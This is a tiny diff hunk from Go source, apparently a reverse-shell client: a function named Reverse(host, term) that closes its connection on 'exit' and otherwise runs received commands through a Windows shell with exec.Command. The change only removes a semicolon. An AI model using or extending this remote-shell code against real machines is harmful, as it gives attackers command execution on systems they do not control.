@@ -55,7 +55,7 @@ func Reverse(host string,term string) {
 			}
 		case "exit":
 			//Exit terminal
-			c.Close();
+			c.Close()
 			os.Exit(0)
 		default:
 			cmd := exec.Command(term, "/C", cmd)
